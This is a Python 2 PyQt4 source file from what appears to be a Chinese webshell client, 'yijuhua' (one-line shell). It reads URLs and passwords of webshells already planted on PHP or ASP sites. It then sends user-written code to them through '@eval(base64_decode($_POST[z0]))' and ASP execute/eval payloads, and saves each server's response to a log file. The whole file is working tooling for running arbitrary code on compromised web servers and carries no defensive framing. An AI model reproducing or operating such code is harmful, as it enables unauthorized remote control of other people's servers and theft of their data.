#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

from PyQt4.QtGui import *
import time
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
from ctypes import *
user32 = windll.LoadLibrary('user32.dll')               # 加载动态链接库
import yijuhua
import class_top1
import br_pr_sogo
import thread
import base64
import httplib,StringIO,gzip,urllib,re
import datetime
datetime.datetime.now()
import g  #公用文件
#reload(sys)
#sys.setdefaultencoding('utf-8')

class   eval_p_a_a(object):
    def __init__(self,ui,model):
        self.ui=ui
        self.model=model

    def Button_php(self):
        #print self.ui.textEdit_PHP_data.toPlainText() #获取路径
        int_model = self.ui.SQLite_tableView.selectionModel()  #获取选中编号
        if len(int_model.selectedRows())==0:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要挂载的URL")
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            return
        thread.start_new_thread(self.php_cs_js,())  #

    def write2file(self, name, url):
        # 写入文本
        try:
            file_object = open(name, 'w')
            file_object.writelines(url)
            file_object.writelines("\r\n")
            file_object.close()
        except Exception, e:
            print "[CrackWorker] Fail to write file,%s,%s,%s" %( name, url, e)

    def web_rand_file_data(self,url,paspassword,web_data):
        try:
            data="""<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
                 <html xmlns="http://www.w3.org/1999/xhtml">
                 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                 <head>
                 <title>网址%s</title>
                 </head>
                 一句话地址:%s密码:%s----------time:%s--------落雪技术支持QQ：2602159946
                 <br/>
                 ------------------下面为返回数据------------------
                 <br/>
                 %s
                 <body>
                 </body>
                 </html>"""%(br_pr_sogo.get_domain(str(url),0),url,paspassword,datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),web_data)

            return data
        except Exception, e:
            return "======="

    def open_file_null(self,file_data):  #清除空行
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        for every in sarr:
            if every.split():
                data+=every
        return data

    def php_cs_js(self):
        self.ui.main_pushButton_PHP.setEnabled(0)  #给改成禁用
        int_model = self.ui.SQLite_tableView.selectionModel()  #获取选中编号
        model = self.ui.SQLite_tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        PHP_data=self.ui.textEdit_PHP_data.toPlainText() #获取内容
        self.write2file("data.php",PHP_data)
        PHP_data=str(PHP_data)  #.decode('utf-8').encode('gbk')

        PHP_data=self.x0_zs(PHP_data)  #清除注释<?php   ?>
        PHP_data=self.x1_zs(PHP_data)  #清除注释/*   */
        PHP_data=self.x2_zs(PHP_data)  #清除//注释
        PHP_data=self.open_file_null(PHP_data)     #清除空行
        #print PHP_data
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
                #s0="http://localhost/long.php"
                #s1="long123"
                if g.bool_asp_php(s0)=="php":
                    fiel_data=self.yijuhua_php_js(str(s0),str(s1),str(PHP_data))
                    data=self.web_rand_file_data(str(s0),str(s1),str(fiel_data))  #HTML内容
                    self.write2file("log/"+br_pr_sogo.get_domain(str(s0),0)+"_"+g.bool_asp_php(s0)+".html",data)  #写入文件
            except BaseException, e:
                print(str(e))
                self.ui.main_pushButton_PHP.setEnabled(1)
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"PHP 执行 完成")
        self.ui.main_pushButton_PHP.setEnabled(1)

    def yijuhua_php_js(self,url,PASS,data): #URL地址 ，密码   只支持PHP
        try:
        #params = "=@eval($_POST[\"echo(\"jinlaile\");die();\"]);"
        #params = "=@eval(base64_decode($_POST[z0]));&z0=ZWNobygiamlubGFpbGUiKTtkaWUoKTs="
            data_base64=base64.b64encode(data)
            params = "=@eval(base64_decode($_POST[z0]));&z0=%s"%(urllib.quote(data_base64))  #quote URL编码
            #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                #print params
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                    return data
                return data
            except Exception,e:
                #print e
                return 0

        except Exception,e:
            #print e
            return 0

    ##################################################################
    #取消注释
    def file_index(self,data,file_data):  #查找字符串是否存在
        if file_data in data:
            return True
        else:
            return False

    def string_index(self,data,file_data):
        nPos = data.find(file_data) #查找字符        #print nPos
        #return data[0:nPos] #复制指定长度的字符
        return "%s\n"%(data[0:nPos])

    def x1_zs(self,file_data): #清除注释/*   */
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        zs=0  #注释标记
        for every in sarr:
            if self.file_index(every,"/*"):
                zs=1
            if self.file_index(every,"*/"):
                zs=0
                continue#终止本次
            if zs==0:
                data+=every
        return data

    def x2_zs(self,file_data): #清除//注释
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        for every in sarr:
            if self.file_index(every,"//"):
                every=self.string_index(every,"//") #截取字符串
            data+=every
        return data

    def x0_zs(self,file_data): #清除注释<?php   ?>
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        zs=0  #注释标记
        for every in sarr:
            if not (self.file_index(every,"<?php") or self.file_index(every,"?>")):
                data+=every
            #        if not file_index(every,"?>"):
            #            data+=every
        return data
    ##########################################################################################
    #ASP操作
    def Button_ASP(self):
        int_model = self.ui.SQLite_tableView.selectionModel()  #获取选中编号
        if len(int_model.selectedRows())==0:
            self.ui.messagebox.append(u"=========================")
            self.ui.messagebox.append(u"提示:请选择要挂载的URL")
            user32.MessageBoxW(0,c_wchar_p(u"请选择有效内容"), c_wchar_p(u"提示"), 0)   # 调用MessageBoxA函数
            return
        thread.start_new_thread(self.ASP_cs_js,())  #

    def ASP_cs_js(self):
        self.ui.main_pushButton_ASP.setEnabled(0)  #给改成禁用
        int_model = self.ui.SQLite_tableView.selectionModel()  #获取选中编号
        model = self.ui.SQLite_tableView.model()#index = model.index(3,1)#data = model.data(index)#print data.toString()
        ASP_data=self.ui.textEdit_ASP_data.toPlainText() #获取内容
        self.write2file("data.asp",ASP_data)
        ASP_data=str(ASP_data)  #.decode('utf-8').encode('gbk')

        ASP_data=self.asp_x0_zs(ASP_data)  #清除<% %>
        ASP_data=self.asp_x2_zs(ASP_data)  #清除'注释
        ASP_data=self.open_file_null(ASP_data)     #清除空行
        ASP_data=self.asp_x2_zs(ASP_data) #清除'注释
        #print ASP_data
        for index in int_model.selectedRows():       #// 对于被选中的每一行
            try:
                int_index=index.row()#获取行号
                s0= model.data(model.index(int_index,0)).toString()
                s1= model.data(model.index(int_index,1)).toString()
#                s0="http://192.168.1.100/long.asp"
#                s1="long123"
                if g.bool_asp_php(s0)=="asp":
                    fiel_data=self.yijuhua_ASP_js(str(s0),str(s1),str(self.str_char(ASP_data)))
                    #print fiel_data
                    data=self.web_rand_file_data(str(s0),str(s1),str(fiel_data))  #HTML内容
                    self.write2file("log/"+br_pr_sogo.get_domain(str(s0),0)+"_"+g.bool_asp_php(s0)+".html",data)  #写入文件
            except BaseException, e:
                print(str(e))
                self.ui.main_pushButton_ASP.setEnabled(1)
                return 0
        self.ui.messagebox.append(u"=========================")
        self.ui.messagebox.append(u"ASP 执行 完成")
        self.ui.main_pushButton_ASP.setEnabled(1)

    def yijuhua_ASP_js(self,url,PASS,params): #URL地址 ，密码   只支持PHP
        try:
            #构造HTTP头
            pattern = re.compile('http:*')
            match = pattern.search(url)
            if(match):
                ztarget = url.replace("http://","").split('/')[0]
                headers={"Host": ztarget,\
                         "User-Agent": "Mozilla/5.0",\
                         "Content-Type": "application/x-www-form-urlencoded",\
                         "Referer": "http://"+ztarget
                }
            else:
                #print "please enter an address....For example: [url]http://www.xxx.com/1.asp[/url]"
                return 0
                #测试  链接
            conn = httplib.HTTPConnection(ztarget)
            params = PASS+params
            try:
                print params
                conn.request(method="POST",url=url,body=params,headers=headers)
                response = conn.getresponse()
                if ('content-encoding', 'gzip') in response.getheaders():
                    compressedstream = StringIO.StringIO(response.read())
                    gzipper = gzip.GzipFile(fileobj=compressedstream)
                    data = gzipper.read()
                else:
                    data = response.read()
                return data
            except Exception,e:
                #print e
                return 0

        except Exception,e:
            #print e
            return 0
    ####################
    def str_char(self,data): #将特殊字符 转换编码
        execute_string=data.replace("\n",":")
        execute_string=execute_string.replace("\"","\"\"")
        execute_string="execute(\""+execute_string+"\")"
        eval_string=execute_string
        eval_string=eval_string.replace("&","\"%26chr(38)%26\"")
        eval_string=eval_string.replace("+","\"%26chr(43)%26\"")
        eval_string=eval_string.replace("\"","\"\"")
        eval_string=eval_string.replace(" ","+")
        eval_string="=eval(\""+eval_string+"\")"
        return eval_string
    def asp_x0_zs(self,file_data): #清除<% %>
        data=""
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        zs=0  #注释标记
        for every in sarr:
            if not (self.file_index(every,"<%") or self.file_index(every,"%>")):
                data+=every
                #        if not file_index(every,"?>"):
                #            data+=every
        return data

    def asp_x2_zs(self,file_data): #清除'注释
        data=""
        #其实在这个中间还是有个问题    如果内容为   '12312'123213'3232232323
        # 也会被认为有效代码应该在  清除前后空格  后判断第一个字符是否为'是的话就全取消掉
        p = re.compile( r'.+?\n')
        sarr = p.findall(file_data)
        for every in sarr:
        #        if self.file_index(every,"'"):
        #            every=self.string_index(every,"'") #截取字符串
            p1 = re.compile( r"'")
            sarr2 = p1.findall(every)
            if not len(sarr2)%2==0 and len(sarr2)>=1:  #偶数或奇数
                #单数
                every=every[0:int(every.rfind("'"))]
            every=every.strip().lstrip()   #清除前后空格
            data+=every+"\n"
        return data


